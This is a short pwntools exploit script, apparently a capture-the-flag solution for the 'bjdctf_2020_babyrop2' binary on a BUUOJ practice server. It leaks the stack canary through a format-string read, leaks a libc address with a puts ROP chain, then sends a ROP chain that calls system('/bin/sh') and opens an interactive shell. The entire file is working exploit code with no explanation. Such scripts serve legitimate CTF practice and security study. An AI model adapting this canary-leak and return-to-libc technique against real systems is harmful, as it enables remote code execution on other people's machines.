from pwn import *


# p = process("./bjdctf_2020_babyrop2")
p = remote("node4.buuoj.cn", 28761)
pro = ELF("./bjdctf_2020_babyrop2")

# context.log_level = "debug"

offset = 7
vuln = 0x00400887
puts_p = pro.plt["puts"]
puts_g = pro.got["puts"]
pop_rdi_ret = 0x00400993


# leak canary
p.recvuntil("I'll give u some gift to help u!\n")
pad = "%7$p"
p.sendline(pad)
canary = p.recvuntil("\n", drop=True)
canary = int(canary.decode("ISO-8859-1"), 16)

# leak libc
p.recvuntil("Pull up your sword and tell me u story!\n")
pad = cyclic(0x18)+p64(canary)+cyclic(0x8)
pad += p64(pop_rdi_ret)+p64(puts_g)+p64(puts_p)
pad += p64(vuln)
p.send(pad)

info = u64(p.recvuntil("\x7f").ljust(8, b"\x00"))
print(hex(info))

# count offset
base = info-0x6f690
system = base+0x45390
binsh = base+0x18cd57

# attack
pad = cyclic(0x18)+p64(canary)+cyclic(0x8)
pad += p64(pop_rdi_ret)+p64(binsh)+p64(system)
p.send(pad)


p.interactive()

